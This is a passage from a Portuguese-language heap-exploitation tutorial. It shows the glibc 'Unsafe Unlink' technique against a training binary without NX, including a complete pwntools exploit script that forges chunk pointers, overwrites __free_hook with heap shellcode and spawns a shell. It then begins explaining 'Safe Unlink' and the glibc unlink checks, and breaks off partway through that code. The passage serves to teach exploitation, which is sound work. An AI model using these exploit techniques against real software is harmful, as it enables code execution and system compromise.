</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x70</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>

<p>Com as alterações realizadas, podemos executar o script com as opções do GDB e inspecionar a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_197.png" alt="Heap" /></p>

<p>Conforme podemos observar, nosso par de “fd” e “bk” forjados estão no início do <em>chunk</em> A, marcados em vermelho, a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> B foi removida, marcado em azul, e conseguimos um campo <code class="language-plaintext highlighter-rouge">prev_size</code> válido para a malloc utilizar, marcado em verde.</p>

<p>Agora se liberarmos o <em>chunk</em> B, a malloc vai checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>, verificar que não existe, tentar consilidar o <em>chunk</em> B com o <em>chunk</em> A, ler o campo <code class="language-plaintext highlighter-rouge">prev_size</code> forjado e subtraí-lo do endereço do <em>chunk</em> B para encontrar o início do <em>chunk</em> A com sucesso. Depois tentará desvincular o <em>chunk</em> B de qualquer lista em que esteja ligado</p>

<p>É neste ponto que a malloc vai performar o processo de <em>unlinking</em> lendo nosso par de “fd” e “bk” forjadas, nos dando a escrita refletida. A malloc vai seguir nosso “fd” acreditando ser outro <em>chunk</em> e sobrescrever o “bk” deste <em>chunk</em> com nosso “bk”. Depois a malloc vai seguir nosso “bk” que também acredita ser outro <em>chunk</em> e sobrescrever seu “fd” com nosso “fd”.</p>

<p>Para que isto funcione, ambos os endereços que fornecemos precisam apontar para um local na memória que permita escrita, isso significa que se tentarmos sobrescrever o <code class="language-plaintext highlighter-rouge">free hook</code> com o endereço da <code class="language-plaintext highlighter-rouge">system()</code>, por exemplo, a segunda metade da nossa escrita refletida vai tentar escrever o endereço do <code class="language-plaintext highlighter-rouge">free hook</code> na função  <code class="language-plaintext highlighter-rouge">system()</code>, causando <code class="language-plaintext highlighter-rouge">sigfault</code> por tentar escrever em um ponto da memória que não permite escrita.</p>

<p>Porém, como estamos lidando com um programa que simula a condição da década de 90, onde o <code class="language-plaintext highlighter-rouge">NX</code> ainda não foi implementado, tudo que escrevermos em memória será executado.</p>

<p>Como verificamos que o binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, precisaremos utilizar o <code class="language-plaintext highlighter-rouge">malloc hook</code> para nosso ataque. Temos um vazamento de endereço da <em>heap</em>, portanto podemos escrever nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na própria <em>heap</em>.</p>

<p>Para testermos esta teoria, vamos editar nosso script novamente. Como já temos uma variável que cria um <code class="language-plaintext highlighter-rouge">shellcode</code>, a primeira coisa que precisamos fazer é escrever este <code class="language-plaintext highlighter-rouge">shellcode</code> no <em>chunk</em> A, porém não podemos esquecer de subtrair o lixo enviado com o tamanho do <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>

<p>Depois, precisamos focar na primeira parte da nossa escrita refletida, onde temos que apontar nosso “bk” para o endereço do nosso <code class="language-plaintext highlighter-rouge">shellcode</code> que se encontra <code class="language-plaintext highlighter-rouge">0x20</code> bytes após o endereço da heap, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_198.png" alt="Diferença entre endereços" /></p>

<p>Precisamos copiar este “bk” para o <code class="language-plaintext highlighter-rouge">free hook</code>, desta forma, quando tentarmos liberar outro <em>chunk</em> depois que o processo de <em>unlinking</em> tenha sido concluída, nosso <code class="language-plaintext highlighter-rouge">shellcode</code> será executado. Para que isso ocorra, precisamos apontar nosso “fd” para o <code class="language-plaintext highlighter-rouge">free hook</code>, menos <code class="language-plaintext highlighter-rouge">0x18</code> bytes.</p>

<blockquote>
  <p>Precisamos deste intervalo, pois a malloc vai considerar qualquer coisa para qual nosso “fd” aponte como um <em>chunk</em> e vai sobrescrever sua “bk” que está a 24 ou <code class="language-plaintext highlighter-rouge">0x18</code> bytes após o início deste <em>chunk</em>.</p>
</blockquote>

<p>O bloco de exploração do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Com as alterações no script, podemos executá-lo com as opções do GDB e inspecionar a heap onde podemos ver nossos “fd” e “bk” forjados no início do <em>chunk</em> A.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_199.png" alt="Fk e bk forjados" /></p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">print</code> para visualizar o endereço da <code class="language-plaintext highlighter-rouge">__free_hook</code>, veremos que ela está exatamente 24 bytes, ou <code class="language-plaintext highlighter-rouge">0x18</code> bytes após o endereço para o qual nosso “fd” aponta, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_200.png" alt="Distância entre fd e __free_hook" /></p>

<p>E nossa “bk” aponta para o endereço do nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_201.png" alt="Bk apontando para o shellcode" /></p>

<p>Tudo que precisamos fazer para ativar o <em>unsafe unlink</em> é liberar o <em>chunk</em> B. A malloc vai checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>, que foi retirada via <em>overflow</em>, e tentar consolidar os <em>chunks</em> A e B. O <code class="language-plaintext highlighter-rouge">prev_size field</code> que fornecemos, será usado para encontrar o início do <em>chunk</em> A, que será submetido ao processo de <em>unlinking</em>.<br />
Nosso “fd” forjado será seguido e nosso “bk” será copiado sobre o “bk” do <em>chunk</em> de destino, que irá se sobrepor ao <code class="language-plaintext highlighter-rouge">free hook</code>.</p>

<p>Então, vamos continuar a execução no GDB, alternar para o terminal de execução do script e liberar o <em>chunk</em> B no índice um, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_202.png" alt="Continuando a execuçã0" /></p>

<p>Voltando ao GDB, podemos pausar a execução e checar a <em>heap</em> novamente, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_203.png" alt="Heap vazia" /></p>

<p>Aparentemente tudo que sobrou dos dois <em>chunks</em> foi o <em>top chunk</em>. Isso acontece, pois, conforme vimos anteriormente, <em>chunks</em> normais podem se consolidar não só com outros <em>chunks</em> livres, mas também com o <em>top chunk</em>. Uma vez que o <em>chunk</em> B era adjacente ao <em>top chunk</em>, primeiramente a malloc consolidou os <em>chunks</em> A e B, e, uma vez que este novo <em>chunk</em> também estava livre, também foi consolidado ao <em>top chunk</em>.</p>

<p>Mas isto não significa que o <em>unsafe unlink</em> não funcionou. Consultando a memória para qual o <code class="language-plaintext highlighter-rouge">free hook</code> aponta, podemos verificar que está apontando para o nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na <em>heap</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_204.png" alt="Free hook apontando para o shellcode" /></p>

<p>Porém, existe algo do qual não estavamos contando, que é a segunda parte do processo de <em>unlinking</em>, no qual nossa “bk” é seguida e nosso “fd” sobrescreve o “fd” do <em>chunk</em> de destino. Podemos ver esta situação na imagem abaixo, onde nosso “fd” foi escrito no meio do nosso <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_205.png" alt="Fd corrompendo o shellcode" /></p>

<p>Isso significa que o <code class="language-plaintext highlighter-rouge">jmp</code> que utilizamos no <code class="language-plaintext highlighter-rouge">shellcode</code> em <code class="language-plaintext highlighter-rouge">Assembly</code> precisa pular 22 bytes, ou <code class="language-plaintext highlighter-rouge">0x16</code> bytes, antes de chegar na execução de código de fato.<br />
Podemos lidar com esta situação, utilizando <code class="language-plaintext highlighter-rouge">NOPs</code>, ou “<em>No operators</em>”.</p>

<blockquote>
  <p>Os <em>No operators</em> são operações em <code class="language-plaintext highlighter-rouge">Assembly</code> que não fazem absolutamente nada, quando a execução passa por estes bytes, simplesmente os ignora e segue o fluxo para a próxima instrução. No caso, se inserirmos 22 <code class="language-plaintext highlighter-rouge">NOPs</code> entre o <code class="language-plaintext highlighter-rouge">jmp</code> para nosso <code class="language-plaintext highlighter-rouge">shellcode</code> e o <code class="language-plaintext highlighter-rouge">shellcode</code> de fato, o <code class="language-plaintext highlighter-rouge">jmp</code> vai pular exatamente os 22 bytes que precisamos. Vamos adicionar os 22 <code class="language-plaintext highlighter-rouge">NOPs</code> na variável, ficando desta forma:</p>
</blockquote>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"nop;"</span><span class="o">*</span><span class="mh">0x16</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Agora podemos executar nosso script com as opções do GDB, liberar o <em>chunk</em> B e inspecionar o <code class="language-plaintext highlighter-rouge">__free_hook</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_206.png" alt="NOPs sobrescritos" /></p>

<p>Conforme podemos observar, nosso <code class="language-plaintext highlighter-rouge">jmp</code>, que agora entende que precisa pular 22 bytes está ilustrado em verde, seguido de 14 <code class="language-plaintext highlighter-rouge">NOPs</code> em vermelho, porém nosso “fd”, não sobrescreveu nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, e sim, os 8 <code class="language-plaintext highlighter-rouge">NOPs</code> restantes. Se fizermos o <em>disassembly</em> da <code class="language-plaintext highlighter-rouge">__free_hook</code> com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos ver que agora nosso <code class="language-plaintext highlighter-rouge">jmp</code> é seguido de nossos <code class="language-plaintext highlighter-rouge">NOPs</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_207.png" alt="NOPs sobrescritos" /></p>

<p>Tudo que precisamos fazer agora em nosso script, é adicionar uma linha para liberar o <em>chunk</em> B, ativando nosso <em>unsafe unlink</em> e outra linha liberando o <em>chunk</em> A, executando nosso <code class="language-plaintext highlighter-rouge">shellcode</code> via <code class="language-plaintext highlighter-rouge">free hook</code>. O bloco final de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"nop;"</span><span class="o">*</span><span class="mh">0x16</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># ativando o unsafe unlink
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># executando o shellcode via unsafe unlink
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Ao executar o script em condições de produção, sem atrelar ao GDB, temos o <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_208.png" alt="Shell obtido" /></p>

<p>Isto exemplifica a forma original da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>.</p>

<blockquote>
  <p>Em resumo, requisitamos dois <em>chunks</em>, A e B, e aproveitamos da vulnerabilidade de <em>heap overflow</em> para retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> B.<br />
Quando liberamos o <em>chunk</em> B corrompido, a malloc entendeu que, por conta da <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> não existir, o <em>chunk</em> anterior era um candidato para consolidação.<br />
A consolidação envolve desvincular o <em>chunk</em> candidato, ou vítima, de sua lista e adiciona seu tamanho ao <em>chunk</em> sendo liberado.<br />
Para encontrar o endereço do candidato, a malloc utiliza o campo <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> livre.<br />
O campo <code class="language-plaintext highlighter-rouge">prev_size</code> é formado pelo ultimo <em>quadword</em> do <em>user data</em> pertencente ao <em>chunk</em> anterior.<br />
Fomos capazes de popular o campo <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> B, porque o <em>chunk</em> A não estava realmente livre, então ainda tinhamos controle sobre o seu <em>user data</em>.<br />
Depois a malloc tentou desvincular o <em>chunk</em> A, e, por conta de ainda termos o controle do seu <em>user data</em>, fomos capazes de forjar um “fk” e um “bk” para que o processo de <em>unlink</em> pudesse utilizar.<br />
Apontamos nosso “fd” para o endereço da <code class="language-plaintext highlighter-rouge">__free_hook</code> menos 24 bytes e nosso “bk” para um <code class="language-plaintext highlighter-rouge">shellcode</code> que escrevemos na <em>heap</em>. O processo de <em>unlinking</em> seguiu nosso “fd” e copiou nosso “bk” sobre o <code class="language-plaintext highlighter-rouge">__free_hook</code>. Depois seguiu nosso “bk” e copiou nosso “fd” de <code class="language-plaintext highlighter-rouge">0x16</code> bytes sobre o nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, do qual conseguimos contornar com uma instrução <code class="language-plaintext highlighter-rouge">jmp</code>.<br />
Finalmente ativamos a função <code class="language-plaintext highlighter-rouge">free()</code>, que foi redirecionadoa via <code class="language-plaintext highlighter-rouge">freee hook</code> para o nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na heap, nos dando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>Não podemos esquecer que o único motivo pelo qual fomos capazes de utilizar o <code class="language-plaintext highlighter-rouge">shellcode</code> desta forma, é porque o binário simula a situação existente antes do ano 2000, quando o <code class="language-plaintext highlighter-rouge">NX</code> ainda não tinha sido implementado e era possível executar comandos escritos em memória.  Esta exploração foi necessária para termos base em técnicas mais atuais de exploração do processo de <em>unlinking</em>.</p>

<p>No entanto, se estivermos lidando com <code class="language-plaintext highlighter-rouge">IoT</code> ou <code class="language-plaintext highlighter-rouge">dispositivos embarcados</code>, podemos ver que o <code class="language-plaintext highlighter-rouge">NX</code> não está ativado mesmo nos dias de hoje.</p>

<h2 id="safe-unlink">Safe Unlink</h2>

<p>Conforme vimos na técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>, fomos capazes de alterar o fluxo de execução de um programa, forjando <em>flags</em> e <em>pointers</em>, porém a execução de código só foi possível, pois estavamos utilizando um binário sem <code class="language-plaintext highlighter-rouge">NX</code> e uma versão antiga da GLIBC.</p>

<p>No entanto, nos dias de hoje, mesmo com a implementação do <code class="language-plaintext highlighter-rouge">NX</code> e com versões modernas da GLIBC, podemos nos aproveitar do processo de <em>unlinking</em> para conseguirmos execução de código utilizando a técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">safe_unlink</code> do material de apoio, temos um binário com o mesmo nome, do qual podemos checar suas implementações de segurança com a ferramente <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_209.png" alt="Checando as implementações do binário" /></p>

<p>Conforme podemos observar, este binário foi compilado com <code class="language-plaintext highlighter-rouge">NX</code> e <code class="language-plaintext highlighter-rouge">Full RELRO</code>. A AMD introduziu o suporte ao <code class="language-plaintext highlighter-rouge">NX</code> nos dispositivos de <em>desktop</em> em 2003, seguido pela Intel em 2004 que chamaram de <code class="language-plaintext highlighter-rouge">XD</code> (<em>eXecute Disable</em>).</p>

<p>Também podemos ver que o binário está ligado a uma versão mais recente da GLIBC, 2.30.</p>

<p>Podemos enumerar este binário em tempo de execução ao carregá-lo no GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_210.png" alt="Enumerando com o GDB" /></p>

<p>Desta vez, temos um vazamento de endereço da GLIBC, porém nenhum vazamento da <em>heap</em>. Além do menu que já vimos anteriormente, com a adição da opção <em>target</em>.</p>

<p>Este binário tem o mesmo comportamento do binário utilizado na técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> com a diferença de que foi compilado com <code class="language-plaintext highlighter-rouge">NX</code> e uma GLIBC mais recente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_211.png" alt="Limitações do binário" /></p>

<p>Ainda temos a limitação de dois <em>chunks</em> para requisitar, que precisam ter um tamanho de um <em>small bin</em> excluindo os tamanhos do <em>fastbins</em>.</p>

<p>Podemos escrever nestes <em>chunks</em> com a opção dois, e liberá-los pelo seu índice com a opção três.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_212.png" alt="Target" /></p>

<p>A opção quatro, assim como os binários explorados em outras técnicas, imprime o conteúdo do <em>data section target</em>.<br />
Se tentarmos criar um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e preenchê-lo com mais dados que o suportado, veremos que o <em>bug</em> de <em>overflow</em> também existe, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_213.png" alt="Overflow da heap" /></p>

<p>Como primeiro objetivo de exploração deste binário, vamos seguir os mesmos passos das explorações anteriores, sobrescrevendo os dados contidos na <em>target</em>. E para isso, obviamente, vamos nos aproveitar do processo de <em>unlinking</em> para conseguir.</p>

<p>Para concluirmos o primeiro objetivo, teremos que efetuar o <em>bypass</em> de duas mitigações, a primeira, obviamente, é a implementação do <code class="language-plaintext highlighter-rouge">NX</code> que vai nos impedir de executar um <code class="language-plaintext highlighter-rouge">shellcode</code> que esteja armazenado na <em>heap</em>. Isso restringe muito o número de alvos viáveis para conseguir a escrita refletida que conseguimos forjando o processo de <em>unlinking</em>.</p>

<blockquote>
  <p>Lembrando que um dos pré-requisitos para conseguir a escrita refletida, é que ambos os endereços fornecidos de “fd” e “bk” respectivamente, apontem para um local da memória que seja passivo à escrita.<br />
Por exemplo, se escrevermos o endereço da <code class="language-plaintext highlighter-rouge">system()</code> na <code class="language-plaintext highlighter-rouge">free hook</code>, a escrita refletida irá tentar escrever o endereço da <code class="language-plaintext highlighter-rouge">free hook</code> para dentro da função <code class="language-plaintext highlighter-rouge">system()</code> que é marcada como não editável.</p>
</blockquote>

<p>A segunda mitigação que temos que efetuar o <em>bypass</em>, é a própria <code class="language-plaintext highlighter-rouge">macro unlink</code>. Nas versões antigas da GLIBC a macro <em>unlink</em> se tornou uma função chamada <code class="language-plaintext highlighter-rouge">unlink_chunk()</code>. O código abaixo, mostra como era a macro antes do ano 2000 que possibilitava o uso da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define inlink(P, BK, FD)
</span><span class="p">{</span>
    <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Tudo que esta função fazia, era uma cópia do “fd” e do “bk” de um <em>chunk</em>, num padrão de escrita refletida.</p>

<p>Já o código abaixo, mostra como a função <code class="language-plaintext highlighter-rouge">unlink</code> existe hoje.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">unlink_chunk</span><span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted size vs. prev_size"</span><span class="p">);</span>
    <span class="n">mchunkptr</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
    <span class="n">mchunkptr</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>
    <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
    <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">p</span><span class="p">)</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list (not small)"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="n">p</span><span class="p">)</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
                <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
